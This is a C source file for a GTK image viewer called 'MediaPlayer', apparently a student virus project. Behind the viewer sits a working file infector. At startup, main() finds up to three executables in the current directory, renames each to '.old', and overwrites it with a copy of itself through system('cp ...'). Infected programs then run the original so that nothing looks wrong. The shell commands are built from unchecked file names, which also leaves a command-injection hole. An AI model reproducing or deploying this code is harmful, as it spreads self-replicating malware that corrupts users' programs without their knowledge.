#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>
#include <gtk/gtk.h>

char lesImages[256][256];
int nbImage = 0;
int indexImg = 0;
GtkWidget *limage;
GtkWidget *window;

static void changeimage(GtkButton* button, gpointer user_data){
	GtkWidget *dialog;
	GtkFileChooserAction action = GTK_FILE_CHOOSER_ACTION_OPEN;
	gint res;

	dialog = gtk_file_chooser_dialog_new ("Open File", GTK_WINDOW(window), GTK_FILE_CHOOSER_ACTION_OPEN, "_Annuler", GTK_RESPONSE_CANCEL, "_Ouvrir", GTK_RESPONSE_ACCEPT, NULL);

	res = gtk_dialog_run (GTK_DIALOG (dialog));
	if (res == GTK_RESPONSE_ACCEPT){
    	char *filename;
    	GtkFileChooser *chooser = GTK_FILE_CHOOSER (dialog);
    	filename = gtk_file_chooser_get_filename (chooser);
		printf("%s\n",filename);    
		GtkWidget *image = GTK_WIDGET (user_data);
		gtk_image_set_from_file(GTK_IMAGE(limage), filename);
    	g_free (filename);
  	}

	gtk_widget_destroy (dialog);
}

static void changeimageright(GtkButton* button, gpointer user_data){
	indexImg++;
	if(indexImg >= nbImage){
		indexImg=0;
	}
	gtk_image_set_from_file(limage, lesImages[indexImg]);
}

static void changeimageleft(GtkButton* button, gpointer user_data){
	indexImg--;
	if(indexImg <= 0){
		indexImg=nbImage-1;
	}
	gtk_image_set_from_file(limage, lesImages[indexImg]);
}

static void activate(GtkApplication *app, gpointer user_data){
	GtkWidget *box;
	GtkWidget *boxImg;
	GtkWidget *buttonimgchooser;
	GtkWidget *buttonleft;
	GtkWidget *buttonright;

	DIR *d;
	struct dirent *dir;
	d = opendir(".");
	if (d) {
		while ((dir = readdir(d)) != NULL) {
			if(strstr(dir->d_name, ".jpg") || strstr(dir->d_name, ".jpeg") || strstr(dir->d_name, ".png")){
				nbImage++;
			}
		}
		closedir(d);
	}
	d = opendir(".");
	if (d) {
		while ((dir = readdir(d)) != NULL) {
			if(strstr(dir->d_name, ".jpg") || strstr(dir->d_name, ".jpeg") || strstr(dir->d_name, ".png")){
				strcpy(lesImages[indexImg], dir->d_name);
				indexImg++;
			}
		}
		closedir(d);
		indexImg = 0;
	}
	
	window = gtk_application_window_new(app);
	gtk_window_set_title (GTK_WINDOW (window), "MediaPlayer");
	gtk_window_set_default_size (GTK_WINDOW (window), 900, 500);

	box = gtk_box_new (GTK_ORIENTATION_VERTICAL, 5);
	gtk_container_add (GTK_CONTAINER (window), box);

	boxImg = gtk_box_new (GTK_ORIENTATION_HORIZONTAL, 5);
	gtk_box_pack_start (GTK_BOX (box), boxImg, TRUE, TRUE, 0);

	buttonleft = gtk_button_new_with_label ("<-");
	gtk_box_pack_start (GTK_BOX (boxImg), buttonleft, FALSE, FALSE, 0);	
	g_signal_connect (buttonleft, "clicked", G_CALLBACK (changeimageleft), NULL);

	limage = gtk_image_new_from_file(lesImages[0]);
	gtk_box_pack_start (GTK_BOX (boxImg), limage, TRUE, TRUE, 0);

	buttonright = gtk_button_new_with_label ("->");
	gtk_box_pack_start (GTK_BOX (boxImg), buttonright, FALSE, FALSE, 0);	
	g_signal_connect (buttonright, "clicked", G_CALLBACK (changeimageright), NULL);

	buttonimgchooser = gtk_button_new_with_label("Choisissez une image a afficher");
	gtk_box_pack_start (GTK_BOX (box), buttonimgchooser, FALSE, FALSE, 0);
	g_signal_connect (buttonimgchooser, "clicked", G_CALLBACK (changeimage), NULL);

	gtk_widget_show_all (window);
}

bool dejaInfecte(char* nomFichier)
{
	char * extension = ".old";
	if(strstr(nomFichier, extension)){ //Si contient l'extension .old --> Déjà infecté
		return true;
	}else{
		DIR *rep = opendir("."); 
		struct dirent *lecture;
		while ((lecture = readdir(rep))) { //On verifie dans le repertoire, s'il y a déjà un .old 
			if((strcmp(lecture->d_name,nomFichier) == 0) && fopen(strcat(lecture->d_name,extension),"r")!=NULL){
				return true;
			}
		}
	}
	return false;
}

char** searchFiles(char* exeption)
{
	char** files = malloc(3*sizeof(char*));
	int cpt=0;
	DIR *rep = opendir("."); //Repertoire couranthttps://stackoverflow.com/questions/17766754/how-to-compare-a-char
	struct stat buf;
	struct dirent *lecture;
	printf("fichier(s) executable(s) :\n");
	while ((lecture = readdir(rep))) { //Contenu du repertoire
		stat(lecture->d_name,&buf);
		char exeptionFile[strlen(lecture->d_name)+3];
		strcpy(exeptionFile,"./");
		strcat(exeptionFile,lecture->d_name);
		if(((buf.st_mode & S_IFMT) == S_IFREG) && (buf.st_mode & S_IXUSR))
		{ //si fichier régu && executable
			if(cpt<3 && strcmp(lecture->d_name,"MediaPlayer.exe")!=0 && !dejaInfecte(lecture->d_name)) 
			{//On ne prend que 3 fichier (lutter contre la sur-infection), et pas le premier hôte
				printf("  - %s\n", lecture->d_name);
				files[cpt] = lecture->d_name;
				cpt+=1;
			}
		}
        }
	closedir(rep);
	return files;	
}

void infecte(char** files, char *arg)
{
	for(int i=0;i<3;i+=1){
		if(files[i]!=NULL){
			char x[strlen(files[i])+strlen(".old")+1];
			char currentFile[strlen(files[i])+1];
			strcpy(currentFile,files[i]);
			strcpy(x,files[i]);
			strcat(x,".old");
			rename(files[i],x);
			char copyFile[500]="";
			strcat(copyFile,"cp ");
			strcat(copyFile,arg);
			strcat(copyFile," ");
			strcat(copyFile,files[i]);
			system(copyFile);
		}
	}
}

void execution(int argc, char *argv[]){
	if(strcmp(argv[0],"./MediaPlayer.exe")!=0)
	{
		char progExec[strlen(argv[0]+5)];//prog.old
		strcpy(progExec,argv[0]);
		strcat(progExec,".old");
		system(progExec);
	}else{
		GtkApplication *app;
		app = gtk_application_new ("com.github.virusmediaplayer", G_APPLICATION_FLAGS_NONE);
		g_signal_connect (app, "activate", G_CALLBACK (activate), NULL);
		g_application_run (G_APPLICATION (app), argc, argv);
		g_object_unref (app);
	}
}

int main(int argc, char *argv[])
{
	char exeptionFile[strlen(argv[0])+1];
	strcpy(exeptionFile,argv[0]);
	char** f = searchFiles(exeptionFile);
	if(f[0]!=NULL)
	infecte(f, argv[0]);
	execution(argc, argv);
	return 0;
}
